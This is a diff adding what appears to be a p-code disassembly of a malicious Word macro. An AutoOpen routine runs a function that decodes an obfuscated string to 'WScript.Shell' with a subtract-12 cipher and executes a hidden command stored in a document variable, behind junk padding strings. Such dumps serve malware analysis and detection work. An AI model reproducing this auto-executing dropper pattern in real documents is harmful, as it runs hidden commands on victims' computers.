@@ -1,0 +1,132 @@
+Line #0:
+	FuncDefn (Function PH_WW())
+Line #1:
+	Dim
+	VarDefn Y_ZA (As String)
+Line #2:
+	LitStr 0x0027 "099127111126117124128058095116113120120"
+	St Y_ZA
+Line #3:
+	Dim
+	VarDefn S_AS (As Object)
+	BoS 0x0000
+	SetStmt
+	Ld Y_ZA
+	ArgsLd M_KZ 0x0001
+	Ld VBA
+	ArgsMemLd CreateObject 0x0001
+	Set S_AS
+Line #4:
+	Dim
+	VarDefn Y_RF (As String)
+Line #5:
+	LitStr 0x0048 "Z2B1L9I2J4B2Y1S6J9S4L7S3B5D1Z4A3E4D5O8Z4C3M7W8F2M8A5H8S6M5A9U5D6R7G1B3L7"
+	St Y_RF
+Line #6:
+	Dim
+	VarDefn P_ZP (As String)
+Line #7:
+	LitStr 0x0048 "L9B3B2W1L4Y4R6F8H6Q0E4X7K2K9X2X1P8O8J1Q1L1A3I2U6S6D4L9U6O1K5H3A9C5K0U4Y9"
+	St P_ZP
+Line #8:
+	Dim
+	VarDefn RR_OO (As String)
+Line #9:
+	LitStr 0x0048 "V5G3E1X2J1W2D0E9W8J1R9Q4E6Z3U5T9Z5Q0H0D7K8I0H1H7K0U6V6O4O4Q7B7Q4O8L3P0W8"
+	St RR_OO
+Line #10:
+	Dim
+	VarDefn H_DJ (As String)
+Line #11:
+	LitStr 0x0048 "E4I2Y4S2G7F4D2H6F2C9K7G1K0R5A1T5P0I2V1N4B1Y2U9K0D3Z5C2T8E5D4E6E7R7M6G6W1"
+	St H_DJ
+Line #12:
+	Dim
+	VarDefn H_SO (As String)
+Line #13:
+	LitStr 0x0048 "L3N4M0G5S0O5C6V1Z7T4T1H2R3V9Z7V3U4S7S0X0V1K2A6F8J3O2H8Y9D2F8X9X9B9A3W4U2"
+	St H_SO
+Line #14:
+	Dim
+	VarDefn S_GP (As String)
+Line #15:
+	LitStr 0x0048 "W4N7Q9I0W3Z9Z6V0J1L2T9E6X3R5D4C5U6P3D9T0M3L8M2O1V4S7K0Z6L0O3R7I3I5Q4Q7L6"
+	St S_GP
+Line #16:
+	Dim
+	VarDefn E_KX (As String)
+Line #17:
+	LitStr 0x0048 "W3S2H9A6D6C4D0U8G3Z5M7G1B3J9D4H8S7C2M7C4D0X2G3B2H0A4C1L1I3S4Q5S9L9Z3F2C0"
+	St E_KX
+Line #18:
+	Dim
+	VarDefn L_NY (As String)
+Line #19:
+	LitStr 0x0048 "M1T9Y3X9V1G5A8F7U7A3M3Y0V1M4I9O3R0N7L0E0E8A4N2U6D6A8P4H0H6R5Q9I9Q2B5O8X3"
+	St L_NY
+Line #20:
+	Dim
+	VarDefn N_BY (As String)
+Line #21:
+	LitStr 0x0048 "U7D6H1U0E9U9H5E3G3J2O3I6Q0M6O2H4J3S2D6K5V4A0W3B3O0A8N0S2H2V6T0R4X1M1Y7U4"
+	St N_BY
+Line #22:
+Line #23:
+	LitStr 0x0004 "V_VK"
+	Ld ActiveDocument
+	ArgsMemLd Variables 0x0001
+	ArgsLd M_KZ 0x0001
+	Ld S_AS
+	ArgsMemCall Exec 0x0001
+Line #24:
+	EndFunc
+Line #25:
+Line #26:
+	FuncDefn (Sub AutoOpen())
+Line #27:
+	LitStr 0x0005 "PH_WW"
+	Ld Application
+	ArgsMemCall Run 0x0001
+Line #28:
+Line #29:
+	EndSub
+Line #30:
+Line #31:
+	FuncDefn (Public Function M_KZ(ByVal P_TU As String))
+Line #32:
+Line #33:
+	StartForVariable
+	Ld L_NK
+	EndForVariable
+	LitDI2 0x0001
+	Ld P_TU
+	FnLen
+	LitDI2 0x0003
+	ForStep
+Line #34:
+	Ld P_TU
+	Ld L_NK
+	LitDI2 0x0003
+	ArgsLd Mid 0x0003
+	St P_ZM
+Line #35:
+	Ld C_FW
+	Ld P_ZM
+	FnInt
+	LitDI2 0x000C
+	Sub
+	ArgsLd Chr 0x0001
+	Add
+	St C_FW
+Line #36:
+	StartForVariable
+	Next
+Line #37:
+Line #38:
+	Ld C_FW
+	St M_KZ
+Line #39:
+Line #40:
+	EndFunc
+Line #41:
+Line #42:
